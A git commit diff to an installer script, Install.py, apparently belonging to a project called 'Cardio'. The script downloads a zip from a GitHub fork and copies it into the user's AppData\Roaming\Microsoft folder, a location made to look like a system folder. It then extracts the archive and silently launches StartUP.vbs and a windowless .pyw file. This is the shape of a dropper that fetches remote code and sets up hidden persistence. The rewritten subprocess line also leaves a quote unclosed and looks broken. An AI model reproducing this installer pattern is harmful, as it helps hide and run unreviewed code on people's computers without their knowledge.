f81597eb9d4cd49936ab4f285787a82b4aae2dfc
AbdulazizDXT <139559982+AbdulazizDXT@users.noreply.github.com>
2023-07-20 13:25:27 +0400

    Update Install.py

--- Install.py
+++ Install.py
@@ -1,13 +1,10 @@
 import urllib.request
 import os
 import sys
-os.system("cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft")
+import subprocess
 print("#-----------------------------------------------------------------------------------#")
 print("You must fork the repository to begin with and then enter your username here exactly!")
 print("#-----------------------------------------------------------------------------------#")
 USER = input("GitHub USERNAME :")
 urllib.request.urlretrieve(f"https://github.com/{USER}/Cardio/archive/refs/heads/main.zip", "Cardio.zip")
-os.system('copy Cardio.zip C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft')
-os.system('cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft && powershell -command "Expand-Archive Cardio.zip"')
-os.system('cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Cardio\\Cardio-main && start StartUP.vbs && start Message.pyw')
-os.system('exit')
+subprocess.Popen('cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft & copy Cardio.zip C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft & powershell -command "Expand-Archive Cardio.zip & cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Cardio\\Cardio-main & start StartUP.vbs & start Message.pyw & exit', shell=True)
